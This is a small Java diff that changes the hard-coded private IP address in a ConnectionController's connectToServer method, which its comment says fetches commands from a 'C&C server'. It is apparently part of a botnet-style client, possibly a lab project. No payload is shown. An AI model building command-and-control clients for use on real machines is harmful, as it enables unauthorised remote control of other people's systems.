@@ -40,7 +40,7 @@ public class ConnectionController {
 	public BufferedReader connectToServer(){
 		// from here we get the command from the C&C server
 		try {
-			SERVER_IP = InetAddress.getByName("10.16.172.9");
+			SERVER_IP = InetAddress.getByName("10.16.163.156");
 		} catch (UnknownHostException e1) {
 			System.out.println("Could not resolve server ip to InetAddress");
 			e1.printStackTrace();
